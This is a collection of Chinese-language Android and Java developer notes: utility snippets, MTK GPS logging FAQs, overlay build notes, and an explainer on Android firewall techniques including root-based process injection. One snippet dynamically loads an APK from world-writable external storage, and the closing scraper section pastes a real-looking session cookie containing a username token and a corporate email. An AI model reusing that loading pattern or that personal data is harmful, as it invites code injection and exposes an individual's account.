第二. GSON解析  Gson.fromJson(jsonString , cls);
第三. FastJson解析 JSON.parseObject(jsonString, cls);
```

## [Snippet] 设置窗体背景模糊

```text
getWindow().setFlags(WindowManager.LayoutParams.FLAG_BLUR_BEHIND, WindowManager.LayoutParams.FLAG_BLUR_BEHIND);
```

## [动态壁纸] 用摄像头拍摄制作动态壁纸

```text
https://blog.csdn.net/jiangwei0910410003/article/details/80461169
```

## [Snippet] 读取ini文件

```text
package com.zryf.sotp;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
 
public class IniFile {
 private Map<String, String> mIni = new HashMap<String, String>();
 public IniFile(File file) throws IOException {
  String line;
  Pattern pattern = Pattern.compile("\\s*([^=] *)=(.*)");
  FileReader fr = new FileReader(file);
  BufferedReader br = new BufferedReader(fr);
  while ((line = br.readLine()) != null) {
   if (!line.startsWith("#")) {
    Matcher matcher = pattern.matcher(line);
    if (matcher.matches()) {
     String key = matcher.group(1).trim();
     String value = matcher.group(2).trim();
     mIni.put(key, value);
    }
   }
  }
  br.close();
  fr.close();
 }
 
 public String get(String key, String defaultvalue) {
  return mIni.get(key);
 }
 public static void main(String[]  args) throws IOException {
  IniFile iniFile = new IniFile(new File("c://test.ini"));
  String data = iniFile.get("ID", "1234");
  System.out.println(data);
 }
}
```

## [Snippet]  [log] 安全的日志打印方法

```text
//控制日志输出的开关必须是 final static 的常量
private static final boolean DEBUG = false;

// 然后用 if 语句把 LogUtil 给控制起来，就不会被编译到系统中了
if (DEBUG) {
    LogUtil.d(TAG, "msg");
}

用 Live Template 把上面的代码包装成一个模板 ifd
```

## [Log] Android之打印长日志（两种方法）

```text
经过查询才得知，Android系统的单条日志打印长度是有限的，在底层Logger驱动程序的一个类Logger.h头文件中有如下两行代码
#define LOGGER_ENTRY_MAX_LEN        (4*1024)  
#define LOGGER_ENTRY_MAX_PAYLOAD    \\  
    (LOGGER_ENTRY_MAX_LEN - sizeof(struct logger_entry))
可以看出，系统显示单条Log信息的长度是固定的，为4*1024个字符长度！

//第一种方式
//打印长的日志
public  static void  LongLoge(String str){
    int max_str_length=2001-NOTGREENDAO.length();
    //大于4000时
    while (str.length()>max_str_length){
        Log.d(NOTGREENDAO, str.substring(0,max_str_length) );
        str=str.substring(max_str_length);
    }
    //剩余部分
    Log.d(NOTGREENDAO, str );
}

//第二种方式
//日志打印不全
public static void d(String tag, String msg) {  //信息太长,分段打印
    //因为String的length是字符数量不是字节数量所以为了防止中文字符过多，
    //  把4*1024的MAX字节打印长度改为2001字符数
    int max_str_length = 2001 - tag.length();
    //大于4000时
    while (msg.length() > max_str_length) {
        Log.i(tag, msg.substring(0, max_str_length));
        msg = msg.substring(max_str_length);
    }
    //剩余部分
    Log.d(tag, msg);
}
```

## [Snippet] 通过 dexloader 代码动态加载apk

```text
public class TestAActivity extends Activity {
 @Override
 protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.main);
  String path=Environment.getExternalStorageDirectory()+"/";
  String fileName="TestB.apk";
  DexClassLoader classLoader=new DexClassLoader(path+fileName, path, null, getClassLoader());
  try {
   Class mLoadClass=classLoader.loadClass("cn.jiepu.testb.TestBActivity");
   Constructor constructor=mLoadClass.getConstructor(new Class[] {});
   Object TestBActivity=constructor.newInstance(new Object[] {});
   Method getMoney=mLoadClass.getMethod("getMoney", null);
   getMoney.setAccessible(true);
   Object money=getMoney.invoke(TestBActivity, null);
   Toast.makeText(this, money.toString(), Toast.LENGTH_LONG).show();
   Log.i("wjh", "success");
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}
```

## [Snippet] android完美退出自身进程的方法

```text
public static void exit(Context context){
 Log.i(TAG, "Tool exit pid="+android.os.Process.myPid()+",tid="+Thread.currentThread().getId()+ ",mytid="+android.os.Process.myUid()+",tname="+Thread.currentThread().getName());
 //需要申请权限<uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/> 
 //ActivityManager manager = (ActivityManager) getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE); 
    //manager.killBackgroundProcesses(getApplicationContext().getPackageName());
 //android.os.Process.sendSignal(android.os.Process.myPid(),android.os.Process.SIGNAL_KILL);//发送杀死信号
 //android.os.Process.sendSignal(android.os.Process.myPid(),android.os.Process.SIGNAL_QUIT);//发送退出信号
 
 //android进程完美退出方法。
 Intent intent = new Intent(Intent.ACTION_MAIN);
    intent.addCategory(Intent.CATEGORY_HOME);
    //intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
           
    //让Activity的生命周期进入后台，否则在某些手机上即使sendSignal 3和9了，还是由于Activity的生命周期导致进程退出不了。除非调用了Activity.finish()
    context.startActivity(intent);
 android.os.Process.killProcess(android.os.Process.myPid());
 //System.runFinalizersOnExit(true);
    System.exit(0);
}
```

## [知识点] sdcard是采用fat32格式的，无法保存权限相关的数据

## 使用系统隐藏api的另外一种方法，使用系统编译的 android.jar 包，并使其的优先级最高

```text
将out/target/common/obj/JAVA_LIBRARIES/framework_intermediates/classes.jar复制到eclipse开发环境中，用user library的方式挂载，使其的优先级比android.jar要高即可
```

## [NET] Android网络防火墙的几种实现方式

```text
a) Android应用层：敏感函数hook
i. 绝大多数Android应用都是调用Android Framework来实现网络通讯。例如：WebView.loadUrl()，HttpClient.execute()，DefaultHttpClient.execute()等。只需穷举这些类的函数，并将它们都Hook住，就可实现拦截上网的功能了。

ii. 当然想要Hook这些函数入口，有两种方式：1. 首先获得root权限，然后通过进程注入，将Client代码注入到应用进程，在进程上网时，应用进程将会发起IPC请求到Server进程，由Server进程来决定是否允许其访问网络。2. 通过修改应用本身来加入Hook代码，从而避免了root手机，相对比较安全。洗大师就是使用了这种方法。

iii. 这种方案的优点是：简单、快速、可实现网络热开关（无需杀死进程）。缺点是：不能拦截所有的网络访问入口。例如：某应用没有调用Android的库，而是自己实现了一个访问网络的库，或者甚至用native代码来实现，那么这时候这个方案将拦截不到任何的上网请求。

b) Android框架层：android.permission.INTERNET权限

i. 在Android系统中，任何想访问网络的应用必须申请android.permission.INTERNET权限。当Zygote在fork()一个AndroidManifest.xml中带有这个权限的应用时，会将当前应用加到inet组中。凡是一个进程的gid组中有inet，那么这个应用就有权限上网。

ii. 因此禁止应用上网有两种方式：1. 修改应用的AndroidManifest.xml，使其没有android.permission.INTERNET权限。2. 获得root权限，然后注入zygote进程，使其在fork()之后，不要将inet设到应用的gid组中。

iii. 这个方案相对于第一个方案来说，它可以彻底的屏蔽一个应用上网。实现起来也不复杂，但是gid组一旦设定后，应用进程将再无权限修改。因此被禁止掉上网权限的进程，想要再次获得上网权限，则必须杀死，然后重新由zygote进程fork()生成。

c) Linux内核层：iptables

i. 在Linux内核中，NetworkFilter在TCP/IP的协议栈中加了相应的Hook。通过这些Hook我们可以对网络数据包可以进行过滤，丢弃，修改等。但直接使用起来相对麻烦。幸好Linux给我们提供了一个强大的工具：iptables来简化这一过程。Iptables是一个Linux命令，通过这个命令，可以对整个系统发出去的包，接收到的包，以及转发的包进行拦截，修改，拒绝等操作。具体起使用方法，这里不再展开，有兴趣的朋友可以自行到网上搜索相应的资料即可。

ii. Iptable不仅可以按照uid来禁用应用上网，还可以分别禁用某个uid的3G上网和Wifi上网。这给用户带来的极大的方便。

iii. 这个方案的优点是，不需要进程注入，所以实现起来相对简单。同时能够将3G网络和Wifi网络分别禁用，用户体验将更加好。此外由于iptables的功能远不止这些，基于iptables可以实现功能更加强大的防火墙。Iptable虽然好，但是也是有缺点的，运行iptables需要root权限。基于iptables的Android防火墙目前有许多，这里有一个开源的项目http://code.google.com/p/droidwall/

有兴趣的朋友，可以研究一下。目前主流安全软件的联网拦截功能，如360手机卫士，手机毒霸等都是使用这一方案。

总结：
以上主要介绍了通过三个层面来控制一个应用的上网。具体使用哪一种，需要看用户的需求，以及手机的系统环境而定。
a) 如果不能获得root权限，基本思路就是定制修改apk，可以考虑加入hook代码，或者是压根在AndroidManifest.xml里将android.permission.INTERNET权限去除。
b) 如果能获得root权限，可以考虑注入zygote，使之fork()之后不加入inet组，还可以注入应用进程加上敏感函数的hook。此外还可以使用iptables命令。
c) 如果用户希望不杀死进程就实现上网权限的开关，并且要求可以分别禁用3G网络和Wifi网络的话，那么非iptables不可了。

其实比较下来，还是基于iptables的方案相对较好。它似乎只有一个缺点就是需要root权限。但大家又知道一旦手机被root以后，安全性反而将大大降低。我们可否找到一种手机既不被root，又能使用iptables的方案呢?

其实是有的。只是这无法通过第三方的应用实现。必须有手机厂商对Android系统进行定制化修改，添加一个具有root权限的service来负责iptables命令的操作。其他进程只有向这个service提出请求，才能间接调用iptables。当然app应用要和这个service沟通，必须遵循一定的协议和获得相应的授权才行，否则又会变的不安全了。

我们 @安卓安全小分队 已经实现了上述方案，并且效果还不错。我们在init.rc里添加了一个service，并且授予这个service root权限。这个service起来之后，会等待client端请求。对于这个client端，我们对外提供了一套SDK，应用程序只需调用这套SDK API就可以和这个root service进行通信了，然后就可以间接执行iptables命令。

以下是我们的SDK API接口。Uid指应用的uid。type是针对的网络类型，可以是3G网络或者是Wifi网络。Blocked表示禁用还是启用网络。

public static final int MOBILE_NETWORK = 1;
public static final int WIFI_NETWORK = 2;
public void setApplicationPolicy(int uid, int type, boolean blocked); //设置拦截状态
public boolean getApplicationPolicy(int uid, int type); //获得当前的拦截状态
```

## [Snippet] 获取wifi信息

```text Java
public void GetWifi() {
 if (!mWifi.isWifiEnabled()) {
  mWifi.setWifiEnabled(true);
 }
 WifiInfo wifiInfo = mWifi.getConnectionInfo();

 if (bAdapt != null) {
  if (!bAdapt.isEnabled()) {
   Intent enBT = new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE);
   startActivityForResult(enBT, REQUEST_ENABLE_BT);
  }

  btMac = bAdapt.getAddress();
 } else {
  btMac = "No Bluetooth Device!";
 }

 if ((WifiMac = wifiInfo.getMacAddress()) == null) {
  WifiMac = "No Wifi Device";
 }

 mac.setTextSize(16);
 String ipString = "";// 本机在WIFI状态下路由分配给的IP地址
 
 /**获得IP地址的方法一：
 int ipAddress = wifiInfo.getIpAddress();
 if (ipAddress != 0) {
        ipString = ((ipAddress & 0xff) + "." + (ipAddress >> 8 & 0xff) + "."
         + (ipAddress >> 16 & 0xff) + "." + (ipAddress >> 24 & 0xff));
 }*/
 //Log.i(this.getClass().getSimpleName(), TypeUtil.typeToString("wifiInfo", wifiInfo));

 // 获得IP地址的方法二（反射的方法）：
 try {
  Field field = wifiInfo.getClass().getDeclaredField("mIpAddress");  
     field.setAccessible(true); 
     InetAddress address =  (InetAddress) field.get(wifiInfo);
     ipString=address.getHostAddress();
     System.out.println("ipString:" + ipString);
 } catch (Exception e) {
     e.printStackTrace();
 }
 // 查看已经连接上的WIFI信息，在Android的SDK中为我们提供了一个叫做WifiInfo的对象，这个对象可以通过WifiManager.getConnectionInfo()来获取。WifiInfo中包含了当前连接中的相关信息。
 // getBSSID() 获取BSSID属性
 // getDetailedStateOf() 获取客户端的连通性
 // getHiddenSSID() 获取SSID 是否被隐藏
 // getIpAddress() 获取IP 地址
 // getLinkSpeed() 获取连接的速度
 // getMacAddress() 获取Mac 地址
 // getRssi() 获取802.11n 网络的信号
 // getSSID() 获取SSID
 // getSupplicanState() 获取具体客户端状态的信息
 StringBuffer sb = new StringBuffer();
 sb.append("\n获取BSSID属性（所连接的WIFI设备的MAC地址）：" + wifiInfo.getBSSID());
 // sb.append("getDetailedStateOf()  获取客户端的连通性：");
 sb.append("\n\n获取SSID 是否被隐藏：" + wifiInfo.getHiddenSSID());
 
 sb.append("\n\n获取wifi IP 地址：" +ipString);
 sb.append("\n\n获取连接的速度：" + wifiInfo.getLinkSpeed());
 sb.append("\n\n获取Mac 地址（手机本身网卡的MAC地址）：" + WifiMac);
 sb.append("\n\n获取802.11n 网络的信号：" + wifiInfo.getRssi());
 sb.append("\n\n获取SSID（所连接的WIFI的网络名称）：" + wifiInfo.getSSID());
 sb.append("\n\n获取具体客户端状态的信息：" + wifiInfo.getSupplicantState());
 mac.setText("WIFI网络信息:  " + sb.toString() + "\n\n蓝牙MAC:  " + btMac);
}
```

## [Snippet] Java重启应用

```text Java
public static void restartApplication() throws URISyntaxException, IOException {
    final String javaBin = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
    final File currentJar = new File(Start.class.getProtectionDomain().getCodeSource().getLocation().toURI());
    if (!currentJar.getName().endsWith(".jar")) {
        return;
    }
    final ArrayList<String> command = new ArrayList<String>();
    command.add(javaBin);
    command.add("-jar");
    command.add(currentJar.getPath());
    final ProcessBuilder builder = new ProcessBuilder(command);
    builder.start();
    System.exit(0);
}
```

## [Snippet] Java管道通讯

```text Java
public InputStream getInputStream(final FileHeader hd) throws RarException, IOException {
 final PipedInputStream in = new PipedInputStream(32 * 1024);
 final PipedOutputStream out = new PipedOutputStream(in);

 // creates a new thread that will write data to the pipe. Data will be
 // available in another InputStream, connected to the OutputStream.
 new Thread(new Runnable() {
  public void run() {
   try {
    extractFile(hd, out);
   } catch (RarException e) {
       e.printStackTrace();
   } finally {
    try {
     out.close();
    } catch (IOException e) {
    }
   }
  }
 }).start();
 return in;
}
```

## [Snippet]  [反射]  [模板] MyClass 反射模板类

```text
public class MyClass {
 private Class<?> class1;
 private Method method1;
 
 private MyClass(Class<?> class1,String name, Class<?>... parameterTypes) throws NoSuchMethodException {
  super();
  this.class1 = class1;
  this.method1=class1.getMethod(name, parameterTypes);
 }
 public static MyClass build(String className,String name, Class<?>... parameterTypes) throws ClassNotFoundException, NoSuchMethodException {
  return new MyClass(className, name, parameterTypes);
  
 }
 public static MyClass build(Class<?> class1,String name, Class<?>... parameterTypes) throws ClassNotFoundException, NoSuchMethodException {
  return new MyClass(class1, name, parameterTypes);
  
 }
 private MyClass(String className,String name, Class<?>... parameterTypes) throws ClassNotFoundException, NoSuchMethodException {
  super();
  this.class1 = forName(className);
  this.method1=class1.getMethod(name, parameterTypes);
 }
 
 public Class<?> getClass1() {
  return class1;
 }
 
 public void setClass1(Class<?> class1) {
  this.class1 = class1;
 }
 
 public Method getMethod1() {
  return method1;
 }
 
 public void setMethod1(Method method1) {
  this.method1 = method1;
 }
 
 public static Class<?> forName(String className) throws ClassNotFoundException {
  return Class.forName(className);
 }
 
    public Object invoke(Object receiver, Object... args) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        return method1.invoke(receiver, args);
    }
}

//使用方法
MyClass class1 = MyClass.build("android.util.Log", "i", new Class[]  { String.class, String.class });
class1.invoke(class1.getClass1(), "tag", "ok");

TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Activity.TELEPHONY_SERVICE);
// telephonyManager.getDeviceId();
MyClass class1 = MyClass.build("android.telephony.TelephonyManager", "getDeviceId", new Class[]  {});
String result = (String) class1.invoke(telephonyManager);
Log.i("xx", result);
Log.i("fuck",(String) MyClass.build("android.telephony.TelephonyManager", "getDeviceId", new Class[]  {}).invoke(telephonyManager));
```

## [Snippet]  [反射] Java 反射例子之android Application 查看和设置：meta-data

```text
http://my.oschina.net/xesam/blog/135333
public class BaseApplication extends Application {
 @Override
 public void onCreate() {
  super.onCreate();
  // android Application 查看和设置：meta-data 
  // 在application应用<meta-data>元素。
  ApplicationInfo appInfo;
  try {
   appInfo = this.getPackageManager().getApplicationInfo(getPackageName(), PackageManager.GET_META_DATA);
   Bundle bundle = appInfo.metaData;
   if (bundle == null) {
    System.out.println("bundle==null");
   }
   bundle.putString("ddd", "xxx");
   Class class1 = Class.forName("android.os.Bundle");   
   Field[]  fields = class1.getFields();//和getDeclaredFields不同
   for (Field field : fields) {
    System.out.println(field.getName());
   }
   System.out.println("========");
   fields = class1.getDeclaredFields();
   for (Field field : fields) {
    System.out.println(field.getName());
   }

   Field field = class1.getDeclaredField("mMap");
   if (field != null) {
    field.setAccessible(true);
    Map<String, Object> mMap = (Map<String, Object>) field.get(bundle);
    if (mMap==null) {
     System.out.println("mMap==null");
     return ;
    }
    for (Map.Entry<String, Object> entry : mMap.entrySet()) {
     String key=entry.getKey();
     Object value=entry.getValue();
     System.out.println(key+"="+value);
    }
   } else {
    System.out.println("field==null");
   }
  } catch (Exception e) {
   e.printStackTrace();
  }
 }
}
```

## [Snippet] Android Json RPC

```text
JSONRPCClient client = JSONRPCClient.create("http://service/uri");
client.setConnectionTimeout(2000);
client.setSoTimeout(2000);
try {
    String string = client.callString("mymethod");
    double d = client.callDouble("pow", x, y);
    int i = client.callInt("add", 56, 25); ...
} catch (JSONRPCException e) {
    e.printStackTrace();
}
```

## Android lib与libs的区别和解决apk动态加载时异常

```text
Android lib与libs的区别和解决apk动态加载时java.lang.IllegalAccessError: Class ref in pre-verified class resolved to unexpected implementation

异常：

按照文章中的理解：

http://www.bubuko.com/infodetail-842175.html，出现java.lang.IllegalAccessError: Class ref in pre-verified class resolved to unexpected implementation 动态加载apk/jar时出现异常的原因是jar中的类冲突。解决办法是：把接口的jar放到lib目录去打包编译，然后config buildpath。不要放在libs,放在libs目录的jar会一起打包进入apk，动态加载相同的类时就会出现java.lang.IllegalAccessError: Class ref in pre-verified class resolved to unexpected implementation异常。

总之解决该异常的方法是：整个程序运行中，包括主程序和插件程序，jar包中的类只包含唯一实例。重复的类不要打包进入apk。即不放在libs目录。
```

## [Snippet] 应用程序的异常处理，捕获到异常信息存进指定的目录，可以上传至服务器中

```text
public class MobileSafeApplication extends Application {
    //开天地，老母子方法
    @Override
    public void onCreate() {
        super.onCreate();
        Thread.currentThread().setUncaughtExceptionHandler(new MyExceptionHandler());
    }
    private class MyExceptionHandler implements UncaughtExceptionHandler{
        @Override
        public void uncaughtException(Thread thread, Throwable ex) {
            Logger.i("","发生了异常，被哥捕获到了。。。。。");
            //并不能把异常消化掉，只是在应用程序挂掉之前，来一个留遗嘱的时间
            try {
                //获取手机适配的信息
                Field[]  fields = Builder.class.getDeclaredFields();
                StringBuffer sb = new StringBuffer();
                for (Field field:fields){
                    String value=field.get(null).toString();
                    String name=field.getName();
                    sb.append(value);
                    sb.append(":");
                    sb.append(name);
                    sb.append("\n");
                }
                //输出异常信息
                FileOutputStream out = new FileOutputStream("/mnt/sdcard/error.log");
                //阻塞性方法，直接写到内存中，内存输出流
                StringWriter wr = new StringWriter();
                PrintWriter err = new PrintWriter(wr);//打印输出流，异步输出流
                ex.printStackTrace(err);
                String errorlog=wr.toString();
                out.write(errorlog.getBytes());
                out.flush();
                out.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            //ActivityManager 可以杀死别的进程，不能自杀，而专注于自杀是 android.os.Process
            android.os.Process.killProcess(android.os.Process.myPid());
        }
    }
}
```

## [Snippet] sqlite3数据库的几种操作方法

```text
// 第一种方法，使用 database.execSQL
public void inertOrUpdateDateBatch(List<String> sqls) {
    SQLiteDatabase db = getWritableDatabase();
    db.beginTransaction();
    try {
        for (String sql : sqls) {
            db.execSQL(sql);
        }
        // 设置事务标志为成功，当结束事务时就会提交事务
        db.setTransactionSuccessful();
    } catch (Exception e) {
        e.printStackTrace();
    } finally {
        // 结束事务
        db.endTransaction();
        db.close();
    }
}

// 第二种方法，使用 database.insert
db.beginTransaction(); // 手动设置开始事务
for (ContentValues v : list) {
    db.insert("bus_line_station", null, v);
}
db.setTransactionSuccessful(); // 设置事务处理成功，不设置会自动回滚不提交
db.endTransaction(); // 处理完成
db.close()

// 第三种方法，效率最高，使用SQLiteStatement
String sql = "insert into bus_line_station(direct,line_name,sno,station_name) values(?,?,?,?)";
SQLiteStatement stat = db.compileStatement(sql);
db.beginTransaction();
for (Station line : busLines) {
    stat.bindLong(1, line.direct);
    stat.bindString(2, line.lineName);
    stat.bindLong(3, line.sno);
    stat.bindString(4, line.stationName);
    stat.executeInsert();
}
db.setTransactionSuccessful();
db.endTransaction();
db.close();
```

## [性能]  [FAQ17812]  第三方应用卡顿问题如何抓取systrace

```text
请使用 user load 抓取mtklog 以及systrace
使用SDK下Monitor抓取systrace 的方法如下:
Trace duration 尽量不要设超过10s，请按照下图所示勾选对应的tags 然后点击OK后再复现卡顿场景，若没复现到再多抓几次
```

## [Snippet] 8.1go获取google短信的通知铃声

```text
android.app.INotificationManager sINM = android.app.INotificationManager.Stub.asInterface(android.os.ServiceManager.getService(Context.NOTIFICATION_SERVICE));
String pkg = "com.google.android.apps.messaging";
int uid = getApplicationContext().getPackageManager().getPackageUid(pkg, 0);
String channelId = "bugle_default_channel";// check from /data/system/notification_policy.xml
android.media.RingtoneManager.getRingtone(getApplicationContext(), sINM.getNotificationChannelForPackage(pkg, uid, channelId, true).getSound()).play();

需要在 CellBroadcastReceiver 的 Android.mk 文件中添加 INotificationManager.aidl
LOCAL_SRC_FILES += src/android/app/INotificationManager.aidl

还需要在 CellBroadcastReceiver 的 AndroidManifest.xml 文件中添加 android:sharedUserId="android.uid.system"
```

## [gps]  [log]  [FAQ13247]  GPS问题分类--LOG相关

```text
1，  MTK的工程师为什么总是需要提供gps debug log?

因为GPS debug log会包含定位过程中的详细信息，例如某个卫星星历有没有解析下来、卫星有没有参与定位、是否存在干扰、clock是否稳定等等。

有了该log，MTK 工程师就可以将GPS问题分析的很彻底，对于找到问题的root cause有极大的帮助。

2，  Gps debug log存放在哪里?

存放在/data/misc/，其名称是gpsdebug.log.时间，例如gpsdebug.log.20141124155650。

所以要取出该log，需要有root权限。

3，  Gps debug log的存放目录是否可以修改?

可以。

请修改如下：

#define LOG_FILE   “/data/misc/gpsdebug.log”

4，  很多客户工程师不知道抓取什么log，才能够方便MTK 工程师快速的分析GPS问题。

客户提交的GPS问题分为以下3类；

A,GPS不能工作，即GPS完全没有启动起来。需要mtklog（APlog、Modem log、Netlog）。

要判断是这种问题，需要按照如下步骤来确认。

Step1：将设置菜单中的位置服务打开。

Step2：check工程模式-----》Location---》YGPS----->INFORMATION--àMNL version是否

为UNKNOWN。如果是UNKNOWN，即表示GPS完全没有启动起来。

B,GPS performance差。需要mtklog（APlog、Modem log、Netlog）、gps debug log。

如何打开GPS debug log?

请在开始测试之前，进入工程模式-----》Location---》YGPS----->NMEA LOG--à找到dbg2file button，当显示成为Disable dbg2file[Need Restart] 表示设置成功了。

然后请退出YGPS。

现在你可以开始你的测试了。

C, AGPS认证测试fail。需要mtklogAPlog、Modem log、Netlog）、gps debug log、仪器log。

5，  GPS NMEA sentence是否可以在mtklog中出现?

可以。

工程模式-----》Location---》YGPS----->NMEA LOG--à找到dbg2ddms button，默认显示成为Disable dbg2ddms[Need Restart] ，即表示已经打开了，这样NMEA sentence就可以log在mtklog—》mobile log---》main log中。

6，  如何通过log判断GPS软件工作正常?

请通过检查是否有NMEA Sentence出现在log中，如果出现，表示软件正常。

1，  如何确定导航系统选择的就是软件配置的

从log中检查GNSSOPMode的数值。
```

## [gps]  [log] 如何打开gps log

```text
如何打开GPS debug log?
请在开始测试之前，进入工程模式-----》Location---》YGPS----->NMEA LOG--à找到dbg2file button，当显示成为Disable dbg2file[Need Restart] 表示设置成功了。
然后请退出YGPS。
现在你可以开始你的测试了。
```

## framework-res.apk覆盖编译方式由RRO替换为SRO

```text
https://blog.csdn.net/gqlovelj/article/details/82014162

一、问题描述：
android O版本，默认指定了framework-res编译时使用RRO的形式加载资源覆盖，这就导致一些 reference resource 类型的文件，如layout、anim、xml目录中的xml文件，在overlay目录不能进行覆盖，编译时会出现很多类似于
device/bbkedu/H6000/overlay/frameworks/base/core/res/res/layout/safe_mode.xml:17: error: Error: No resource found that matches the given name (at 'background' with value '@drawable/safe_mode_background').

但是我们的systemUI需要定制这些reference resource，所以需要将RRO编译更改为SRO。
二、SRO，RRO相关定义与区别。
1.SRO
即静态Overlay，发生在编译时，需要在Android系统源码环境中进行配置。

2.RRO
即运行时Overlay，该机制的资源替换发生在运行时。

3.区别：
（1）RRO能直接定制替换第三方APK的资源，而不需要其源码。SRO如上节所述，则需要对应APK的源码才能完成，一般而言，第三方是不会提供项目源码的。
（2）RRO的编译结果会得到一个xxx_overlay.apk,加上原项目的apk，总共会有2个apk，而SRO最终只会得到一个已经完成资源替换的apk。得到的overlay.apk可以视为一个正常的apk，因为它能被安装，含有自己的AndroidManifest.xml文件，当然正常下，overlay.apk是不含有执行代码的。
（3）RRO不能替换AndroidManifest.xml文件及reference resource 类型的文件，如layout、anim、xml目录中的xml文件。虽然RRO具有自己的AndroidManifest.xml文件，但它却不能替换源项目中的AndroidManifest.xml文件。关于layout目录中的xml文件，SRO是可以替换的。
以上来源于GrayMonkey：Android Overlay机制
```

## [爬虫] 通过爬虫抓取FAQ

```text
FAQ 爬虫 https://online.mediatek.com/FAQ/api/ui/SW/FAQ19494/detail    需要post
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh-TW;q=0.7,zh;q=0.6
Connection: keep-alive
Content-Length: 14
Content-Type: application/x-www-form-urlencoded
Cookie: WSS_FullScreenMode=false; username=KH5ztksOLRQD+ffTecQAVhCaw5vObe954ljER26Ea2M=; usersystem=MOL; zhangzhefeng@sagereal.com.lang=zh-CN; __utmc=153516580; __utmc=246731354; __utmz=246731354.1565666097.26.10.utmcsr=search.mediatek.com|utmccn=(referral)|utmcmd=referral|utmcct=/searchresultframe.aspx; Hm_lvt_fac1ca85886ec6ae51442958d23d7be2=1565666097,1565666131,1565666179,1565666326; __utma=153516580.1425507218.1555902994.1565666069.1566450257.18; __utmz=153516580.1566450257.18.18.utmcsr=online.mediatek.com|utmccn=(referral)|utmcmd=referral|utmcct=/_layouts/15/mol/ui/ext/home.aspx; srh_shcn=%5B%22modemlog%20stopped%22%2C%22%E8%AF%AD%E8%A8%80%22%2C%22icu%22%2C%22%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E8%BF%9E%E6%8E%A5%22%2C%22mtk_default_data_off%22%2C%22FAQ04794%22%2C%22%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E6%95%B0%E6%8D%AE%E8%BF%9E%E6%8E%A5%E5%BC%80%E5%85%B3%22%2C%22%E5%A3%81%E7%BA%B8%22%2C%22%E9%94%81%E5%B1%8F%20%E6%8C%89%E9%94%AE%E7%81%AF%22%2C%22%E9%94%81%E5%B1%8F%20%E9%94%AE%E7%9B%98%E7%81%AF%22%2C%22%E9%94%81%E5%B1%8F%22%2C%22ERFIDX%22%2C%22recovery%22%2C%22FAQ13817%22%2C%22%E6%89%93%E5%BC%80root%E6%9D%83%E9%99%90%22%2C%22%E5%88%86%E5%8C%BA%E8%A1%A8%22%2C%22proguard%22%2C%22%E7%98%A6%E8%BA%AB%22%2C%22aapt%22%2C%22hal3%22%2C%22lint%22%2C%22reserve%20memory%22%2C%22mtkfusionrild%22%2C%22mblock-8-ccci%22%2C%22FAQ09296%22%2C%22AUTO_ADD_GLOBAL_DEFINE_BY_NAME%22%2C%22FAQ10474%22%2C%22FAQ10435%22%2C%22FAQ03065%22%2C%22FAQ11012%22%2C%22FAQ12292%22%2C%22FAQ14338%22%2C%22FAQ17868%22%2C%22wifi%20%E5%88%97%E8%A1%A8%20%E6%BB%91%E4%B8%8D%E5%8A%A8%22%2C%22RecyclerView%22%2C%22wifi%20%E6%BB%91%E4%B8%8D%E5%8A%A8%22%2C%22%E5%88%97%E8%A1%A8%E6%BB%91%E5%8A%A8%22%2C%22MTK_WAPI_SUPPORT%22%2C%22%E6%97%A0%203G%20%E4%BF%A1%E5%8F%B7%22%2C%22radio%20is%20locked%20by%20other%20modul%22%2C%22radioTurnedOff%22%2C%22radio%20is%20locked%22%2C%22%E6%BB%91%E5%8A%A8%E4%B8%8D%E4%BA%86%22%2C%22consyslog%22%2C%22CTS%20Customize%20Guideline.docx%22%2C%22FAQ10820%22%2C%22android.os.strictmode.LeakedClosableViolation%3A%20A%20resource%20was%20acquired%20at%20attached%20stack%20trace%20but%20never%20released%22%2C%22How_to_Write_an_Android.mk%22%2C%22Android_Build_System_for_customer_4.1.pptx%22%2C%2210820%22%2C%22%E4%B9%A6%E7%AD%BE%20%E6%96%87%E4%BB%B6%E5%A4%B9%22%2C%22partnerbookmark%22%2C%22RTC%2032K%20mode%20setting%20wrong%22%2C%22%E5%AE%89%E5%85%94%E5%85%94%22%2C%22ALPS04040853%22%2C%22mtk%20meta%20software%20version%22%2C%22lmkd%22%2C%22Fota%20system%22%2C%22USB%E5%90%8D%E7%A7%B0%E4%BF%AE%E6%94%B9%E7%B3%BB%E5%88%97%22%2C%22GENERIC_FAILURE%22%2C%22MTK_SPECIAL_FACTORY_RESET%22%2C%22omadm%22%2C%22MTK_WAPPUSH_SUPPORT%22%5D; 